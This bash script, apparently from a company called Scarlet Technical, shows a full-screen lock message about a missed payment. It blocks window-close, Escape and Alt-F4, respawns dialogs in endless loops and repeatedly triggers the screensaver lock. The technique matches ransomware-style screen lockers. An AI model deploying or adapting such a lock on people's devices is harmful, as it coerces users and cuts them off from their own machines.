#!/bin/bash
# Scarlet Technical - Device Lock Overlay
# Shows a full-screen lock screen using available display tools

MESSAGE="${1:-This device has been locked due to a missed payment. Contact Scarlet Technical at (765) 555-0100 or visit scarlet-technical.polsia.app}"

# Try to find X display
if [ -z "$DISPLAY" ]; then
  for d in /tmp/.X11-unix/X*; do
    [ -S "$d" ] && DISPLAY=":$(basename "$d" | sed 's/X//')" && export DISPLAY && break
  done
fi
[ -z "$DISPLAY" ] && export DISPLAY=":0"

# Also try to get DBUS session for notifications
if [ -z "$DBUS_SESSION_BUS_ADDRESS" ]; then
  export DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$(id -u)/bus"
fi

# Function to show lock with zenity
try_zenity() {
  command -v zenity &>/dev/null || return 1
  while true; do
    zenity --error \
      --title="DEVICE LOCKED - Scarlet Technical" \
      --text="$(printf '🔒  DEVICE LOCKED\n\nScarlet Technical\n\n%s\n\n📞 (765) 555-0100\n🌐 scarlet-technical.polsia.app' "$MESSAGE")" \
      --width=650 --height=320 2>/dev/null
    sleep 1
  done
}

# Function to show lock with Python tkinter
try_python() {
  command -v python3 &>/dev/null || return 1
  python3 -c "
import sys, time
try:
    import tkinter as tk
    msg = '''$MESSAGE'''
    root = tk.Tk()
    root.title('DEVICE LOCKED')
    root.configure(bg='black')
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.resizable(False, False)
    tk.Label(root, text='🔒  DEVICE LOCKED', font=('Helvetica', 48, 'bold'), fg='red', bg='black').pack(pady=40)
    tk.Label(root, text='Scarlet Technical', font=('Helvetica', 24), fg='white', bg='black').pack(pady=10)
    tk.Label(root, text=msg, font=('Helvetica', 16), fg='white', bg='black', wraplength=700, justify='center').pack(pady=20)
    tk.Label(root, text='Contact: (765) 555-0100  |  scarlet-technical.polsia.app', font=('Helvetica', 14), fg='yellow', bg='black').pack(pady=20)
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    root.bind('<Escape>', lambda e: None)
    root.bind('<Alt-F4>', lambda e: None)
    root.mainloop()
except Exception as e:
    while True:
        time.sleep(60)
" && return 0
  return 1
}

# Function to show lock with xmessage
try_xmessage() {
  command -v xmessage &>/dev/null || return 1
  while true; do
    xmessage -center -buttons "" \
      "DEVICE LOCKED - Scarlet Technical

$MESSAGE

Contact: (765) 555-0100 | scarlet-technical.polsia.app" 2>/dev/null
    sleep 1
  done
}

# Function: show using notify-send + screensaver (fallback for headless)
try_screensaver() {
  command -v xdg-screensaver &>/dev/null && xdg-screensaver lock 2>/dev/null &
  # If we have notify-send, post a persistent notification
  command -v notify-send &>/dev/null && \
    notify-send -u critical "DEVICE LOCKED" "$MESSAGE" 2>/dev/null || true
  # Sleep loop to keep the process alive
  while true; do
    command -v xdg-screensaver &>/dev/null && xdg-screensaver lock 2>/dev/null || true
    sleep 30
  done
}

# Try each method in order of quality
try_python || try_zenity || try_xmessage || try_screensaver
